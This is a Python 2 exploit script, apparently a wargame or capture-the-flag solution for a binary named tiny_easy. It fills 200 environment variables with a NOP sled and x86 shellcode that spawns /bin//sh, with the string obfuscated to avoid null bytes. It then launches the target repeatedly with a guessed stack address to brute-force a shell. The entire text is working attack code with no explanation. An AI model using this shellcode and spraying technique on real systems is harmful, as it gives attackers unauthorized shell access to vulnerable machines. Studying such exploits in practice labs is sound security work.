import subprocess

shellcode = "\x31\xc0\x50\xba\x2e\x2e\x72\x67\x81\xc2\x01\x01\x01\x01\x52\xb9\x2e\x62\x69\x6e\x83\xc1\x01\x51\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
sled = "\x90"*8192

envvar = {}

for i in range(200):
        envvar["TEST{}".format(i)] = sled + shellcode

jmpaddr = "\x30\xa1\xfd\xff"

for i in range(100):
        print i
        p = subprocess.Popen([jmpaddr], executable="/home/tiny_easy/tiny_easy", env=envvar)
        p.wait()
